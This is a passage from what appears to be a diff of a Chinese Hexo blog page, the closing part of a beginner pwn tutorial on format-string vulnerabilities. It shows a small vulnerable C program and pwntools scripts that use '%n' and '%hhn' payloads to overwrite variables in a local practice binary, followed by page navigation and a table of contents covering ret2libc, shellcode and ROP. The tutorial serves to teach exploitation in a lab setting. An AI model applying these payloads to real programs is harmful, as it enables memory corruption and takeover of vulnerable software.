class="line">  <span class="keyword">if</span> (c == <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>修改为c == 3输出<code>modified c.</code></p>
+<p>可以这样修改：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./str2'</span>)</span><br><span class="line"></span><br><span class="line">addr_c = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr_c)</span><br><span class="line">payload = <span class="string">'aaa%8$na'</span>+p32(addr_c)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>其中，4位4位一个内存单元。<code>aaa%</code>是第6个参数，<code>8$na</code>是第7个参数，addr_c就是第8个参数了。所以<code>%8$n</code>前有3个字符，再取第8个参数的地址（%后的数字设置为8），就将addr_c的内容覆盖为3了。</p>
+<p><strong>这里掌握的小技巧：没有必要把地址放在最前面，只需要找到它对应的偏移就可以。</strong></p>
+<p>若是覆盖大数字，变量在内存中都是以字节的格式存储的，在 x86、x64 中是按照小端存储的，格式化字符串里面有两个标志用的上了：<br><img src="/2020/04/08/pwn入门学习/小端存储.png" alt></p>
+<blockquote>
+<p>h：对于整数类型，printf 期待一个从 short 提升的 int 尺寸的整型参数<br>hh：对于整型类型，printf 期待一个从 char 提升的 int 尺寸的整形参数</p>
+</blockquote>
+<p>意思是说<code>hhn</code>写入的就是单字节，<code>hn</code>写入的就是双字节。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./overwrite'</span>)</span><br><span class="line">b_addr=<span class="number">0x0804A028</span></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">'%104x'</span>+<span class="string">'%6$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%7$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%8$hhn'</span>+<span class="string">'%222x'</span>+<span class="string">'%9$hhn'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#sh.sendline(fmtstr_payload(6, &#123;0x804A028:0x12345678&#125;))</span></span><br><span class="line"><span class="comment">#pwntools带着一个函数,很方便</span></span><br><span class="line"><span class="keyword">print</span> sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>地址经过前面的<code>p32()</code>打包后，会变成4个字符，4*4+104=120，即0x78。120+222=342，即0x156,然后依次是：0x234、0x312，又因为 hh 是写入单字节的，又是小端存储，也就是只能取后边两个，所以连起来就是 0x12345678。</p>
+<p>参考文章<a href="https://www.yuque.com/hxfqg9/hs80y0/aedgn4" target="_blank" rel="noopener">PWN入门（格式化字符串）</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/gdb/" rel="tag"># gdb</a>
+          
+            <a href="/tags/ropgadget/" rel="tag"># ropgadget</a>
+          
+            <a href="/tags/ret2libc/" rel="tag"># ret2libc</a>
+          
+            <a href="/tags/动态链接/" rel="tag"># 动态链接</a>
+          
+            <a href="/tags/延迟绑定机制/" rel="tag"># 延迟绑定机制</a>
+          
+            <a href="/tags/PLT-GOT/" rel="tag"># PLT&GOT</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/09/红队工具Covenant/" rel="next" title="红队工具Covenant">
+                <i class="fa fa-chevron-left"></i> 红队工具Covenant
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/09/密码学笔记（一）/" rel="prev" title="密码学笔记（一）">
+                密码学笔记（一） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-number">1.</span> <span class="nav-text">ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PLT表和GOT表"><span class="nav-number">1.1.</span> <span class="nav-text">PLT表和GOT表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#延迟绑定机制"><span class="nav-number">1.2.</span> <span class="nav-text">延迟绑定机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ASLR"><span class="nav-number">1.3.</span> <span class="nav-text">ASLR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exec-Shield（NX）"><span class="nav-number">1.4.</span> <span class="nav-text">Exec-Shield（NX）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#StackGuard"><span class="nav-number">1.5.</span> <span class="nav-text">StackGuard</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2libc-1"><span class="nav-number">1.6.</span> <span class="nav-text">ret2libc</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">2.</span> <span class="nav-text">ret2shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用pwntools中shellcraft-sh-函数生成shellcode"><span class="nav-number">2.1.</span> <span class="nav-text">利用pwntools中shellcraft.sh()函数生成shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#全局变量绝对地址"><span class="nav-number">2.1.1.</span> <span class="nav-text">全局变量绝对地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jmp-esp跳板定位相对地址"><span class="nav-number">2.1.2.</span> <span class="nav-text">jmp esp跳板定位相对地址</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ropgadget"><span class="nav-number">3.</span> <span class="nav-text">ropgadget</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP链的构造"><span class="nav-number">3.1.</span> <span class="nav-text">ROP链的构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux系统调用"><span class="nav-number">3.2.</span> <span class="nav-text">linux系统调用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#定位溢出点、python加载的方法"><span class="nav-number">4.</span> <span class="nav-text">定位溢出点、python加载的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#C程序："><span class="nav-number">4.1.</span> <span class="nav-text">C程序：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-生成字符串"><span class="nav-number">4.2.</span> <span class="nav-text">0x02 生成字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msf-pattern-create"><span class="nav-number">4.2.1.</span> <span class="nav-text">msf-pattern_create</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#peda"><span class="nav-number">4.2.2.</span> <span class="nav-text">peda</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwngdb"><span class="nav-number">4.2.3.</span> <span class="nav-text">pwngdb</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python加载"><span class="nav-number">4.3.</span> <span class="nav-text">python加载</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#定位到exploit函数"><span class="nav-number">4.3.1.</span> <span class="nav-text">定位到exploit函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定位到system函数的物理地址"><span class="nav-number">4.3.2.</span> <span class="nav-text">定位到system函数的物理地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#定位到system函数在函数领空的虚拟内存地址"><span class="nav-number">4.3.3.</span> <span class="nav-text">定位到system函数在函数领空的虚拟内存地址</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#格式化字符串与canary保护"><span class="nav-number">5.</span> <span class="nav-text">格式化字符串与canary保护</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#canary保护"><span class="nav-number">5.1.</span> <span class="nav-text">canary保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#格式化字符串"><span class="nav-number">5.2.</span> <span class="nav-text">格式化字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#泄露任意地址的内存"><span class="nav-number">5.3.</span> <span class="nav-text">泄露任意地址的内存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#覆盖栈内存"><span class="nav-number">5.4.</span> <span class="nav-text">覆盖栈内存</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
